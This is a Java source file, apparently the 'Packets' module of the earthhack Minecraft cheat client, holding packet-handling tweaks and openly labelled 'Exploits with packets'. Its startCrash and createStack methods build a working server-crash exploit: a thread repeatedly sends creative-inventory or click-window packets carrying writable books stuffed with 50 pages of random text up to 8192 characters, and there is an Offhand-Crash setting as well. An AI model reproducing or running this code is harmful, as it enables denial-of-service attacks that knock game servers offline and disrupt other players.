package me.earth.earthhack.impl.modules.misc.packets;

import java.util.Collections;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicBoolean;
import me.earth.earthhack.api.module.Module;
import me.earth.earthhack.api.module.util.Category;
import me.earth.earthhack.api.setting.Setting;
import me.earth.earthhack.api.setting.settings.BooleanSetting;
import me.earth.earthhack.api.setting.settings.EnumSetting;
import me.earth.earthhack.api.setting.settings.NumberSetting;
import me.earth.earthhack.impl.gui.visibility.PageBuilder;
import me.earth.earthhack.impl.gui.visibility.Visibilities;
import me.earth.earthhack.impl.managers.Managers;
import me.earth.earthhack.impl.managers.thread.scheduler.Scheduler;
import me.earth.earthhack.impl.modules.misc.packets.ListenerBlockMulti;
import me.earth.earthhack.impl.modules.misc.packets.ListenerBlockState;
import me.earth.earthhack.impl.modules.misc.packets.ListenerCollect;
import me.earth.earthhack.impl.modules.misc.packets.ListenerConfirmTransaction;
import me.earth.earthhack.impl.modules.misc.packets.ListenerDeath;
import me.earth.earthhack.impl.modules.misc.packets.ListenerDestroyEntities;
import me.earth.earthhack.impl.modules.misc.packets.ListenerDisconnect;
import me.earth.earthhack.impl.modules.misc.packets.ListenerEntity;
import me.earth.earthhack.impl.modules.misc.packets.ListenerEntityTeleport;
import me.earth.earthhack.impl.modules.misc.packets.ListenerHeadLook;
import me.earth.earthhack.impl.modules.misc.packets.ListenerHeldItemChange;
import me.earth.earthhack.impl.modules.misc.packets.ListenerPlayerListHeader;
import me.earth.earthhack.impl.modules.misc.packets.ListenerPosLook;
import me.earth.earthhack.impl.modules.misc.packets.ListenerSetSlot;
import me.earth.earthhack.impl.modules.misc.packets.ListenerSound;
import me.earth.earthhack.impl.modules.misc.packets.ListenerTick;
import me.earth.earthhack.impl.modules.misc.packets.ListenerVelocity;
import me.earth.earthhack.impl.modules.misc.packets.ListenerWorldClient;
import me.earth.earthhack.impl.modules.misc.packets.util.BookCrashMode;
import me.earth.earthhack.impl.modules.misc.packets.util.PacketPages;
import me.earth.earthhack.impl.util.client.SimpleData;
import net.minecraft.block.state.IBlockState;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.util.math.BlockPos;

public class Packets
extends Module {
    protected static final Random RANDOM = new Random();
    protected static final String SALT = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    protected final Setting<PacketPages> page = this.register(new EnumSetting<PacketPages>("Page", PacketPages.Safe));
    protected final Setting<Boolean> fastTransactions = this.register(new BooleanSetting("Transactions", true));
    protected final Setting<Boolean> fastTeleports = this.register(new BooleanSetting("Teleports", true));
    protected final Setting<Boolean> asyncTeleports = this.register(new BooleanSetting("Async-Teleports", false));
    protected final Setting<Boolean> fastDestroyEntities = this.register(new BooleanSetting("Fast-Destroy", true));
    protected final Setting<Boolean> fastSetDead = this.register(new BooleanSetting("SoundRemove", true));
    protected final Setting<Boolean> fastDeath = this.register(new BooleanSetting("Fast-Death", true));
    protected final Setting<Boolean> fastHeadLook = this.register(new BooleanSetting("Fast-HeadLook", false));
    protected final Setting<Boolean> fastEntities = this.register(new BooleanSetting("Fast-Entity", true));
    protected final Setting<Boolean> fastEntityTeleport = this.register(new BooleanSetting("Fast-EntityTeleport", true));
    protected final Setting<Boolean> cancelEntityTeleport = this.register(new BooleanSetting("Cancel-EntityTeleport", true));
    protected final Setting<Boolean> fastVelocity = this.register(new BooleanSetting("Fast-Velocity", true));
    protected final Setting<Boolean> cancelVelocity = this.register(new BooleanSetting("Cancel-Velocity", true));
    protected final Setting<Boolean> safeHeaders = this.register(new BooleanSetting("Safe-Headers", true));
    protected final Setting<Boolean> noHandChange = this.register(new BooleanSetting("NoHandChange", false));
    protected final Setting<Boolean> fastCollect = this.register(new BooleanSetting("Fast-Collect", false));
    protected final Setting<Boolean> miniTeleports = this.register(new BooleanSetting("Mini-Teleports", true));
    protected final Setting<Boolean> noBookBan = this.register(new BooleanSetting("AntiBookBan", false));
    protected final Setting<Boolean> fastBlockStates = this.register(new BooleanSetting("Fast-BlockStates", false));
    protected final Setting<Boolean> fastSetSlot = this.register(new BooleanSetting("Fast-SetSlot", false));
    protected final Setting<Boolean> ccResources = this.register(new BooleanSetting("CC-Resources", false));
    protected final Setting<Boolean> noSizeKick = this.register(new BooleanSetting("No-SizeKick", false));
    protected final Setting<BookCrashMode> bookCrash = this.register(new EnumSetting<BookCrashMode>("BookCrash", BookCrashMode.None));
    protected final Setting<Integer> bookDelay = this.register(new NumberSetting<Integer>("Book-Delay", 5, 0, 500));
    public Setting<Integer> bookLength = this.register(new NumberSetting<Integer>("Book-Length", 600, 100, 8192));
    protected final Setting<Integer> offhandCrashes = this.register(new NumberSetting<Integer>("Offhand-Crash", 0, 0, 5000));
    protected final Map<BlockPos, IBlockState> stateMap;
    protected final AtomicBoolean crashing = new AtomicBoolean();
    protected String pages;

    public Packets() {
        super("Packets", Category.Misc);
        this.stateMap = new ConcurrentHashMap<BlockPos, IBlockState>();
        this.listeners.add(new ListenerCollect(this));
        this.listeners.add(new ListenerConfirmTransaction(this));
        this.listeners.add(new ListenerBlockState(this));
        this.listeners.add(new ListenerBlockMulti(this));
        this.listeners.add(new ListenerPosLook(this));
        this.listeners.add(new ListenerSound(this));
        this.listeners.add(new ListenerTick(this));
        this.listeners.add(new ListenerWorldClient(this));
        this.listeners.add(new ListenerDisconnect(this));
        this.listeners.add(new ListenerDeath(this));
        this.listeners.add(new ListenerVelocity(this));
        this.listeners.add(new ListenerEntityTeleport(this));
        this.listeners.add(new ListenerDestroyEntities(this));
        this.listeners.add(new ListenerPlayerListHeader(this));
        this.listeners.add(new ListenerHeldItemChange(this));
        this.listeners.add(new ListenerSetSlot(this));
        this.listeners.add(new ListenerHeadLook(this));
        this.listeners.addAll(new ListenerEntity(this).getListeners());
        new PageBuilder<PacketPages>(this, this.page).addPage(v -> v == PacketPages.Safe, (Setting<?>)this.fastTransactions, (Setting<?>)this.miniTeleports).addPage(v -> v == PacketPages.Danger, (Setting<?>)this.noBookBan, (Setting<?>)this.offhandCrashes).register(Visibilities.VISIBILITY_MANAGER);
        SimpleData data = new SimpleData(this, "Exploits with packets.");
        data.register(this.page, "-Safe all Settings that are safe to use.\n-Danger all settings that might kick.");
        data.register(this.bookCrash, "Crashes the server with \"Book-Packets\".");
        data.register(this.fastTransactions, "Speeds up ConfirmTransaction packets a tiny bit.");
        data.register(this.fastTeleports, "Speeds up ConfirmTeleport packets a tiny bit.");
        data.register(this.asyncTeleports, "Might cause issues with movement and other modules.");
        data.register(this.fastDestroyEntities, "Makes Entities die faster.");
        data.register(this.fastDeath, "Makes Entities die faster.");
        data.register(this.fastEntities, "Makes Entities update faster.");
        data.register(this.fastEntityTeleport, "Makes Entities update faster.");
        data.register(this.cancelEntityTeleport, "Should be on. For Debugging.");
        data.register(this.fastVelocity, "Applies Velocity faster.");
        data.register(this.cancelVelocity, "Same as Cancel-EntityTeleport.");
        data.register(this.noHandChange, "Prevents the server from changing your hand");
        data.register(this.ccResources, "Only for Crystalpvp.cc and their current ResourcePack patch. not recommended on other servers.");
        data.register(this.safeHeaders, "Fixes a bug in Mojangs code that could crash you.");
        data.register(this.miniTeleports, "Allows you to see when Entities move minimally.");
        data.register(this.fastSetDead, "Speeds up SoundRemove a bit.");
        data.register(this.noBookBan, "Only turn on if you are bookbanned. Can cause issues otherwise.");
        data.register(this.bookDelay, "Delay between 2 \"Book-Packets\".");
        data.register(this.offhandCrashes, "Packets to send per tick. A value of 0 means Offhand-Crash is off.");
        data.register(this.noSizeKick, "Won't kick you for badly sized packets. This can cause weird stuff to happen.");
        this.setData(data);
        this.fastBlockStates.addObserver(e -> {
            if (!((Boolean)e.getValue()).booleanValue()) {
                Scheduler.getInstance().schedule(() -> {
                    if (!this.fastBlockStates.getValue().booleanValue()) {
                        this.stateMap.clear();
                    }
                });
            }
        });
    }

    @Override
    protected void onLoad() {
        this.bookCrash.setValue(BookCrashMode.None);
        this.offhandCrashes.setValue(0);
        this.pages = this.genRandomString(this.bookLength.getValue());
    }

    @Override
    public String getDisplayInfo() {
        String result = null;
        if (this.bookCrash.getValue() != BookCrashMode.None) {
            result = "\u00a7cBookCrash";
            if (this.offhandCrashes.getValue() != 0) {
                result = result + ", Offhand";
            }
        } else if (this.offhandCrashes.getValue() != 0) {
            result = "\u00a7cOffhand";
        }
        return result;
    }

    public boolean isNoKickActive() {
        return this.isEnabled() && this.noSizeKick.getValue() != false;
    }

    public boolean areCCResourcesActive() {
        return this.isEnabled() && this.ccResources.getValue() != false;
    }

    public boolean areMiniTeleportsActive() {
        return this.isEnabled() && this.miniTeleports.getValue() != false;
    }

    public boolean isNoBookBanActive() {
        return this.isEnabled() && this.noBookBan.getValue() != false;
    }

    public void startCrash() {
        this.crashing.set(true);
        Managers.THREAD.submit(() -> {
            try {
                ItemStack stack = this.createStack();
                while (this.isEnabled() && this.bookCrash.getValue() != BookCrashMode.None && Packets.mc.player != null) {
                    Packet packet = null;
                    switch (this.bookCrash.getValue()) {
                        case None: {
                            this.crashing.set(false);
                            return;
                        }
                        case Creative: {
                            packet = new CPacketCreativeInventoryAction(0, stack);
                            break;
                        }
                        case ClickWindow: 
                        case Console: {
                            packet = new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, stack, 0);
                            break;
                        }
                    }
                    if (packet != null) {
                        Packets.mc.player.connection.sendPacket(packet);
                    }
                    Thread.sleep(this.bookDelay.getValue().intValue());
                }
            }
            catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            finally {
                this.crashing.set(false);
            }
        });
    }

    protected ItemStack createStack() {
        ItemStack stack = new ItemStack(Items.WRITABLE_BOOK);
        NBTTagList list = new NBTTagList();
        NBTTagCompound tag = new NBTTagCompound();
        if (this.bookCrash.getValue() == BookCrashMode.Console) {
            if (this.pages.length() != 8192) {
                this.pages = this.genRandomString(8192);
                this.bookLength.setValue(8192);
                this.bookDelay.setValue(225);
            }
        } else if (this.pages.length() != this.bookLength.getValue().intValue()) {
            this.pages = this.genRandomString(this.bookLength.getValue());
        }
        for (int i = 0; i < 50; ++i) {
            list.appendTag(new NBTTagString(this.pages));
        }
        tag.setString("author", mc.getSession().getUsername());
        tag.setString("title", "\n CrashBook \n");
        tag.setTag("pages", list);
        stack.setTagInfo("pages", list);
        stack.setTagCompound(tag);
        return stack;
    }

    private String genRandomString(Integer length) {
        StringBuilder salt = new StringBuilder();
        while (salt.length() < length) {
            int index = (int)(RANDOM.nextFloat() * (float)SALT.length());
            salt.append(SALT.charAt(index));
        }
        return salt.toString();
    }

    public Map<BlockPos, IBlockState> getStateMap() {
        if (this.fastBlockStates.getValue().booleanValue()) {
            return this.stateMap;
        }
        return Collections.emptyMap();
    }
}
